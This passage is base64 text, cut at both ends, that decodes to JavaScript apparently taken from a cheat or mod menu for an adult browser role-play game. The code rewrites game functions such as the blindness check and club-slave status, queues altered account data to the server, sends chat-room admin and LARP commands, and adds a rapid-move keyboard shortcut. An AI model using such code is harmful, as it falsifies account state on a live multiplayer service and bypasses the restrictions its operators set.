Sk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMCIpIHsKICAgIGphdmFzY3JpcHQ6TG9nQWRkKCJFc2NhcGVkIiwgIkFzeWx1bSIsIEN1cnJlbnRUaW1lKTsKICAgIExvZ0FkZCgiQ2x1YlNsYXZlIiwgIk1hbmFnZW1lbnQiLCBDdXJyZW50VGltZSk7CiAgICBMb2dBZGQoIkJsb2NrQ2hhbmdlIiwgIlJ1bGUiLCBDdXJyZW50VGltZSk7CiAgICBNYW5hZ2VtZW50SXNDbHViU2xhdmUgPSBmdW5jdGlvbigpIHsKICAgIHJldHVybiBmYWxzZQogICAgfQogICAgTWFuYWdlbWVudENsdWJTbGF2ZURpYWxvZyA9IGZ1bmN0aW9uKFBsYXllcikge30KICAgIE1hbmFnZW1lbnRGaW5pc2hDbHViU2xhdmUoKQogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTEiKSB7CiAgICBqYXZhc2NyaXB0OmFsZXJ0KCdTdGFydCBhIEdHVFMgc2Vzc2lvbiBiZWZvcmUgcnVubmluZywgcmVmcmVzaCB0byBzZWUgY2hhbmdlcycpOwogICAgUGxheWVyLkdhbWUuR0dUUy5MZXZlbCA9IHByb21wdCgiRW50ZXIgR0dUUyBMZXZlbCAoMS02KSIpOzsKICAgIFNlcnZlckFjY291bnRVcGRhdGUuUXVldWVEYXRhKHsKICAgIEdhbWU6IFBsYXllci5HYW1lCiAgICB9KTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgICAKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMiIpIHsKICAgIGphdmFzY3JpcHQ6RGlhbG9nU2V0UmVwdXRhdGlvbigiRG9taW5hbnQiLCBwcm9tcHQoIkVudGVyIFN1Yi9Eb20gUmVwICgtMTAwIHRvIDEwMCkiKSk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEzIikgewogICAgamF2YXNjcmlwdDpuYW1lID0gcHJvbXB0KCJFbnRlciBOaWNrbmFtZSIpOzsKICAgIFBsYXllci5OaWNrbmFtZSA9IG5hbWU7CiAgICBTZXJ2ZXJBY2NvdW50VXBkYXRlLlF1ZXVlRGF0YSh7IE5pY2tuYW1lOiBuYW1lIH0sIHRydWUpOyAgIAogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsgIAogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE0IikgewogICAgamF2YXNjcmlwdDpBY3Rpdml0eVNldEFyb3VzYWwoUGxheWVyLCAxKTsKICAgIEFjdGl2aXR5T3JnYXNtUHJlcGFyZShQbGF5ZXIsIHRydWUpOwogICAgQWN0aXZpdHlPcmdhc21HYW1lUmVzaXN0Q291bnQgPSAxOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxNSIpIHsKICAgIGphdmFzY3JpcHQ6d2luZG93Lm9wZW4oJ2h0dHBzOi8vZGlzY29yZC5nZy92M0pCanlTNG14JywgJ19ibGFuaycpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxNiIpIHsKICAgIGphdmFzY3JpcHQ6KGZ1bmN0aW9uKCkge2xldCBpbnB1dCA9IHByb21wdCgiTWFsZSAvIEZlbWFsZSAvIE1peGVkIik7CiAgICBsZXQgcGxhY2Vob2xkZXI7CiAgICAKICAgIGlmIChpbnB1dC50b0xvd2VyQ2FzZSgpID09PSAibWFsZSIpIHsKICAgICAgcGxhY2Vob2xkZXIgPSAiTSI7CiAgICB9IGVsc2UgaWYgKGlucHV0LnRvTG93ZXJDYXNlKCkgPT09ICJtaXhlZCIpIHsKICAgICAgcGxhY2Vob2xkZXIgPSAiWCI7CiAgICB9IGVsc2UgewogICAgICBwbGFjZWhvbGRlciA9ICIiOwogICAgfSAgCgogICAgCiAgICBDaGF0Um9vbVN0YXJ0KHBsYWNlaG9sZGVyLCAiIiwgbnVsbCwgbnVsbCwgIkludHJvZHVjdGlvbiIsIEJhY2tncm91bmRzVGFnTGlzdCk7CiAgfSkoKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTciKSB7CiAgICBqYXZhc2NyaXB0OihmdW5jdGlvbigpIHtsZXQgaW5wdXQgPSBwcm9tcHQoIlN0YXJ0IGEgTEFSUCBSb29tIGFzIEFkbWluIEZpcnN0XG5TdGFydCAvIFNraXAgLyBNaXhlZCAvIFNodWZmbGUgLyBUZWFtIC8gV2luIChjb2xvcikiKS50b0xvd2VyQ2FzZSgpOwoKICAgIGlmIChpbnB1dCA9PT0gInN0YXJ0IikgewogICAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUdhbWUiLCB7IEdhbWVQcm9ncmVzczogIlN0YXJ0IiB9KTsKICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09ICJza2lwIikgewogICAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUdhbWUiLCB7IEdhbWVQcm9ncmVzczogIlNraXAiIH0pOwogICAgfSBlbHNlIGlmIChpbnB1dCA9PT0gInNodWZmbGUiKSB7CiAgICAgIFNlcnZlclNlbmQoIkNoYXRSb29tQWRtaW4iLCB7IE1lbWJlck51bWJlcjogQ2hhdFJvb21DaGFyYWN0ZXJbMV0uTWVtYmVyTnVtYmVyLCBBY3Rpb246ICJTaHVmZmxlIiB9KTsKICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09ICJ0ZWFtIikgewogICAgICBjb25zdCBEaWN0aW9uYXJ5ID0gbmV3IERpY3Rpb25hcnlCdWlsZGVyKCkKICAgICAgLnNvdXJjZUNoYXJhY3RlcihQbGF5ZXIpCiAgICAgIC5idWlsZCgpOwogICAgU2VydmVyU2VuZCgiQ2hhdFJvb21DaGF0IiwgeyBDb250ZW50OiAiTEFSUENoYW5nZVRlYW1DbGFzcyIsIFR5cGU6ICJBY3Rpb24iLCBEaWN0aW9uYXJ5OiBEaWN0aW9uYXJ5IH0pOwogIH0gZWxzZSBpZiAoaW5wdXQuc3RhcnRzV2l0aCgid2luIikpIHsKICAgICAgbGV0IGNvbG9yID0gaW5wdXQuc2xpY2UoNCkudHJpbSgpOwogICAgICBjb2xvciA9IGNvbG9yLmNoYXJBdCgwKS50b1VwcGVyQ2FzZSgpICsgY29sb3Iuc2xpY2UoMSk7CiAgICAgIEdhbWVMQVJQQWRkQ2hhdExvZygiRW5kR2FtZSIsIFBsYXllciwgUGxheWVyLCBPbmxpbmVHYW1lRGljdGlvbmFyeVRleHQoIlRlYW0iICsgY29sb3IpLCAwLCAwLCAiIzAwMDBCMCIpOwogICAgfQogIH0pKCk7CgogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxOCIpIHsKICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGJ1dHRvbkNvbnRhaW5lcik7CiAgYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE5IikgewogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzZXR0aW5nc01lbnUpOwogICAgc2V0dGluZ3NNZW51LnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9CiAgCgogIC8vIEhpZGUgZGQgbWVudQogIHNlbGVjdC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwp9KTsKCi8vRW5kIG9mIEREIG1lbnVfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKCmZ1bmN0aW9uIHVwZGF0ZUNvbnRleHRNZW51KCkgewogIHdoaWxlIChjb250ZXh0TWVudS5maXJzdENoaWxkKSB7CiAgICBjb250ZXh0TWVudS5yZW1vdmVDaGlsZChjb250ZXh0TWVudS5maXJzdENoaWxkKTsKICB9CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoaGVhZGVyKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChjcmVhdGVTZXBhcmF0b3IoKSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uMSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uMik7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uMyk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uNCk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uNSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uNik7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uNyk7CiAgaWYgKHZpc2IpIHsKICAgIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjgpOwogIH0gZWxzZSB7CiAgICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b245KTsKICB9CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uMTApOwogIC8vIEFkZCB0aGUgZGQgbWVudSB0byB0aGUgY29udGV4dCBtZW51CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoY3JlYXRlU2VwYXJhdG9yKCkpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGRyb3Bkb3duQnV0dG9uKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChzZWxlY3QpOwogIAp9CnVwZGF0ZUNvbnRleHRNZW51KCk7Ci8vIFVwZGF0ZSBjb250ZXh0ICBtZW51IHdoZW4gb3BlbmVkCmNvbnRleHRNZW51LmFkZEV2ZW50TGlzdGVuZXIoJ2NvbnRleHRtZW51JywgZnVuY3Rpb24oKSB7CiAgdXBkYXRlQ29udGV4dE1lbnUoKTsKfSk7CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGV4dE1lbnUpOwp9KTsKCi8vIEhpZGUgdGhlIGNvbnRleHQgbWVudQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogICAgaWYgKGNvbnRleHRNZW51T3BlbikgewogICAgICAgIHZhciBjb250ZXh0TWVudSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoImRpdltzdHlsZSo9J2ZpeGVkJ10iKTsKICAgICAgICBpZiAoY29udGV4dE1lbnUpIHsKICAgICAgICAgICAgY29udGV4dE1lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICAgICAgQ2hhdFJvb21DbGlja0NoYXJhY3RlcihQbGF5ZXIpOwogICAgICAgICAgICBEaWFsb2dMZWF2ZSgpOwogICAgICAgIH0KICAgICAgICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICAgIH0KfSk7CgoKLy9TdGFydCBvZiBrZXlib2FyZCBzaG9ydGN1dHNfX19fX19fX19fX19fX19fX19fCgpsZXQgYmFja3RpY2tQcmVzc2VkID0gZmFsc2U7CmxldCBsYXN0S2V5UHJlc3NlZCA9IG51bGw7Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgZnVuY3Rpb24oZXZlbnQpIHsKICBpZiAoZXZlbnQua2V5ID09PSAiYCIgJiYgIWJhY2t0aWNrUHJlc3NlZCkgewogICAgYmFja3RpY2tQcmVzc2VkID0gdHJ1ZTsKICB9CiAgZWxzZSBpZiAoYmFja3RpY2tQcmVzc2VkKSB7CiAgICBsYXN0S2V5UHJlc3NlZCA9IGV2ZW50LmtleTsKICB9Cn0pOwoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5dXAiLCBmdW5jdGlvbihldmVudCkgewogIGlmIChldmVudC5rZXkgPT09ICJgIikgewogICAgYmFja3RpY2tQcmVzc2VkID0gZmFsc2U7CiAgICBsYXN0S2V5UHJlc3NlZCA9IG51bGw7CiAgfQp9KTsKCnNldEludGVydmFsKGZ1bmN0aW9uKCkgewogIGlmIChsYXN0S2V5UHJlc3NlZCA9PT0gIiwiIHx8IGxhc3RLZXlQcmVzc2VkID09PSAiLiIpIHsKICAgIGxldCBhY3Rpb24gPSBsYXN0S2V5UHJlc3NlZCA9PT0gIiwiID8gIk1vdmVMZWZ0IiA6ICJNb3ZlUmlnaHQiOwogICAgU2VydmVyU2VuZCgiQ2hhdFJvb21BZG1pbiIsIHsKICAgICAgTWVtYmVyTnVtYmVyOiBQbGF5ZXIuTWVtYmVyTnVtYmVyLAogICAgICBBY3Rpb246IGFjdGlvbiwKICAgIH0pOwogIH0KfSwgNTApOwovL1N0YXJ0IG9mIFBlcnNpc3RhbnQgTWVudSBfX19fX19fX19fX19fX19fX19fX18KCmNvbnN0IHNldHRpbmdzTWVudSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpzZXR0aW5nc01lbnUuaWQgPSAic2V0dGluZ3MtbWVudSI7CnNldHRpbmdzTWVudS5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CnNldHRpbmdzTWVudS5zdHlsZS50b3AgPSAiMjBweCI7CnNldHRpbmdzTWVudS5zdHlsZS5sZWZ0ID0gIjIwcHgiOwpzZXR0aW5nc01lbnUuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmZmYiOwpzZXR0aW5nc01lbnUuc3R5bGUuYm9yZGVyID0gIjFweCBzb2xpZCAjY2NjIjsKc2V0dGluZ3NNZW51LnN0eWxlLnBhZGRpbmcgPSAiM3B4IjsKc2V0dGluZ3NNZW51LnN0eWxlLmJvcmRlclJhZGl1cyA9ICIxMHB4IjsKc2V0dGluZ3NNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CnNldHRpbmdzTWVudS5zdHlsZS56SW5kZXggPSAiOTk5OSI7CgovL0JDTSBsb2dvICAgCmNvbnN0IEJDTUVsb2dvMSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwpCQ01FbG9nbzEuc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CkJDTUVsb2dvMS5zdHlsZS5mbG9hdCA9ICJsZWZ0IjsKQkNNRWxvZ28xLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjEwcHgiOwpCQ01FbG9nbzEuc3R5bGUud2lkdGggPSAiNDBweCI7IApCQ01FbG9nbzEuc3R5bGUuaGVpZ2h0ID0gIjQwcHgiOyAKc2V0dGluZ3NNZW51LmFwcGVuZENoaWxkKEJDTUVsb2dvMSk7CgovL09wdGlvbnMgYW5kIHN0eWxlX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCmNvbnN0IG9wdGlvbjEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwpvcHRpb24xLnRleHRDb250ZW50ID0gIkFudGlibGluZCI7CmNvbnN0IGNoZWNrYm94MSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CmNoZWNrYm94MS50eXBlID0gImNoZWNrYm94IjsKY2hlY2tib3gxLmlkID0gIm9wdGlvbjEiOwpjaGVja2JveDEuc3R5bGUubWFyZ2luUmlnaHQgPSAiNXB4IjsKY2hlY2tib3gxLnN0eWxlLnZlcnRpY2FsQWxpZ24gPSAibWlkZGxlIjsKb3B0aW9uMS5hcHBlbmRDaGlsZChjaGVja2JveDEpOwpzZXR0aW5nc01lbnUuYXBwZW5kQ2hpbGQob3B0aW9uMSk7Cgpjb25zdCBvcHRpb24yID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGFiZWwiKTsKb3B0aW9uMi50ZXh0Q29udGVudCA9ICJSZWFsaXN0aWMgVGFsa2luZyI7CmNvbnN0IGNoZWNrYm94MiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CmNoZWNrYm94Mi50eXBlID0gImNoZWNrYm94IjsKY2hlY2tib3gyLmlkID0gIm9wdGlvbjIiOwpjaGVja2JveDIuc3R5bGUubWFyZ2luUmlnaHQgPSAiNXB4IjsKY2hlY2tib3gyLnN0eWxlLnZlcnRpY2FsQWxpZ24gPSAibWlkZGxlIjsKb3B0aW9uMi5hcHBlbmRDaGlsZChjaGVja2JveDIpOwpzZXR0aW5nc01lbnUuYXBwZW5kQ2hpbGQob3B0aW9uMik7Cgpjb25zdCBvcHRpb24zID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGFiZWwiKTsKb3B0aW9uMy50ZXh0Q29udGVudCA9ICJTb3VuZCI7CmNvbnN0IGNoZWNrYm94MyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CmNoZWNrYm94My50eXBlID0gImNoZWNrYm94IjsKY2hlY2tib3gzLmlkID0gIm9wdGlvbjMiOwpjaGVja2JveDMuc3R5bGUubWFyZ2luUmlnaHQgPSAiNXB4IjsKY2hlY2tib3gzLnN0eWxlLnZlcnRpY2FsQWxpZ24gPSAibWlkZGxlIjsKb3B0aW9uMy5hcHBlbmRDaGlsZChjaGVja2JveDMpOwpzZXR0aW5nc01lbnUuYXBwZW5kQ2hpbGQob3B0aW9uMyk7CgpvcHRpb24xLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7Cm9wdGlvbjEuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAiY2VudGVyIjsKb3B0aW9uMS5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7Cm9wdGlvbjEuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwpvcHRpb24xLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKb3B0aW9uMS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CgpvcHRpb24yLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7Cm9wdGlvbjIuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAiY2VudGVyIjsKb3B0aW9uMi5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7Cm9wdGlvbjIuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwpvcHRpb24yLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKb3B0aW9uMi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CgpvcHRpb24zLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7Cm9wdGlvbjMuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAiY2VudGVyIjsKb3B0aW9uMy5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7Cm9wdGlvbjMuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwpvcHRpb24zLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKb3B0aW9uMy5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CgpvcHRpb24xLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZW50ZXIiLCBmdW5jdGlvbigpIHsKICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkIjsKICBvcHRpb24xLnN0eWxlLmN1cnNvciA9ICJwb2ludGVyIjsKfSk7CgpvcHRpb24xLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlbGVhdmUiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImxpZ2h0Z3JlZW4iOwogIH0gZWxzZSB7CiAgICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKb3B0aW9uMi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWVudGVyIiwgZnVuY3Rpb24oKSB7CiAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZCI7CiAgb3B0aW9uMi5zdHlsZS5jdXJzb3IgPSAicG9pbnRlciI7Cn0pOwoKb3B0aW9uMi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWxlYXZlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94Mi5jaGVja2VkKSB7CiAgICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJsaWdodGdyZWVuIjsKICB9IGVsc2UgewogICAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCm9wdGlvbjMuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VlbnRlciIsIGZ1bmN0aW9uKCkgewogIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGQiOwogIG9wdGlvbjMuc3R5bGUuY3Vyc29yID0gInBvaW50ZXIiOwp9KTsKCm9wdGlvbjMuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VsZWF2ZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAibGlnaHRncmVlbiI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgovLyBDaGVja2JveCBzdGF0ZSB3aGVuIHRoZSBwYWdlIGxvYWRzCmNoZWNrYm94MS5jaGVja2VkID8gb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCIgOiBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKY2hlY2tib3gyLmNoZWNrZWQgPyBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IiA6IG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwpjaGVja2JveDMuY2hlY2tlZCA/IG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiIDogb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CgoKLy8gQ2hhbmdlcyBsYWJlbCBiYWNrZ3JvdW5kIGNvbG9yIHdoZW4gdGhlIGNoZWNrYm94IGlzIGNoZWNrZWQKY2hlY2tib3gxLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDEuY2hlY2tlZCkgewogICAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CmNoZWNrYm94Mi5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiOwogIH0gZWxzZSB7CiAgICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwpjaGVja2JveDMuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IjsKICB9IGVsc2UgewogICAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCi8vT3B0aW9ucyBBY3Rpb25zX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCmZ1bmN0aW9uIHJ1bk9wdGlvbjEoKSB7CiAgICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgICAgZnVuY3Rpb24gR2V0QmxpbmRMZXZlbDAoKSB7CiAgICAgICAgbGV0IGJsaW5kTGV2ZWwgPSAwOwogICAgICAgIHJldHVybiBibGluZExldmVsOwogICAgICB9CiAgICAgIFBsYXllci5HZXRCbGluZExldmVsID0gR2V0QmxpbmRMZXZlbDA7CiAgICAgIFBsYXllci5HZXRCbGluZExldmVsKCk7CiAgICB9CiAgfQogIAogIGZ1bmN0aW9uIHJ1bk9wdGlvbjIoKSB7CiAgICBmdW5jdGlvbiBSdW5FeHByZXNzaW9uQW5pbWF0aW9uU3RlcCgpIHsKICAgICAgQ2hhcmFjdGVyU2V0RmFjaWFsRXhwcmVzc2lvbihQbGF5ZXIsICJNb3V0aCIsIGV4cHJlc3Npb25BbmltYXRpb25bZXhwcmVzc2lvbkFuaW1hdGlvbkluZGV4KytdKTsKICAgICAgaWYgKGV4cHJlc3Npb25BbmltYXRpb25JbmRleCA8IGV4cHJlc3Npb25BbmltYXRpb24ubGVuZ3RoKSB7CiAgICAgICAgc2V0VGltZW91dChSdW5FeHByZXNzaW9uQW5pbWF0aW9uU3RlcCwgMTAwMCk7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbiA9IG51bGw7CiAgICAgIH0KICAgIH0KICAKICAgIGZ1bmN0aW9uIFJ1bkV4cHJlc3Npb25BbmltYXRpb24obGlzdCkgewogICAgICBpZiAoZXhwcmVzc2lvbkFuaW1hdGlvbikgewogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBleHByZXNzaW9uQW5pbWF0aW9uID0gbGlzdDsKICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbkluZGV4ID0gMDsKICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbkV4ID0gSW52ZW50b3J5R2V0KFBsYXllciwgIk1vdXRoIik7CiAgICAgIGlmIChleHByZXNzaW9uQW5pbWF0aW9uRXggJiYgZXhwcmVzc2lvbkFuaW1hdGlvbkV4LlByb3BlcnR5ICYmIGV4cHJlc3Npb25BbmltYXRpb25FeC5Qcm9wZXJ0eS5FeHByZXNzaW9uKSB7CiAgICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbltleHByZXNzaW9uQW5pbWF0aW9uLmxlbmd0aCAtIDFdID0gZXhwcmVzc2lvbkFuaW1hdGlvbkV4LlByb3BlcnR5LkV4cHJlc3Npb247IC8vc2V0IGxhc3QgdG8gY3VycmVudAogICAgICB9CiAgICAgIFJ1bkV4cHJlc3Npb25BbmltYXRpb25TdGVwKCk7CiAgICB9CiAgCiAgICBmdW5jdGlvbiBORVd0YWxraW5nKCkgewogICAgICB2YXIgbXNnID0gRWxlbWVudFZhbHVlKCJJbnB1dENoYXQiKS50cmltKCk7CiAgICAgIGlmICghbXNnLnN0YXJ0c1dpdGgoIi8iKSAmJiAhbXNnLnN0YXJ0c1dpdGgoIioiKSAmJiAhbXNnLnN0YXJ0c1dpdGgoIiEiKSkgewogICAgICAgIGlmIChtc2cubGVuZ3RoID4gMTApIHsKICAgICAgICAgIFJ1bkV4cHJlc3Npb25BbmltYXRpb24oW251bGwsICJHcmluIiwgIlNtaXJrIiwgbnVsbCwgIkdyaW4iLCAiU21pcmsiLCBudWxsXSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgIFJ1bkV4cHJlc3Npb25BbmltYXRpb24oW251bGwsICJHcmluIiwgIlNtaXJrIiwgbnVsbF0pOwogICAgICAgIH0KICAgICAgfQogICAgICBPTER0YWxraW5nKCk7CiAgICB9CiAgCiAgICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgICAgdmFyIGV4cHJlc3Npb25BbmltYXRpb247CiAgICAgIHZhciBleHByZXNzaW9uQW5pbWF0aW9uSW5kZXggPSAwOwogICAgICB2YXIgT0xEdGFsa2luZyA9IENoYXRSb29tU2VuZENoYXQ7CiAgICAgIENoYXRSb29tU2V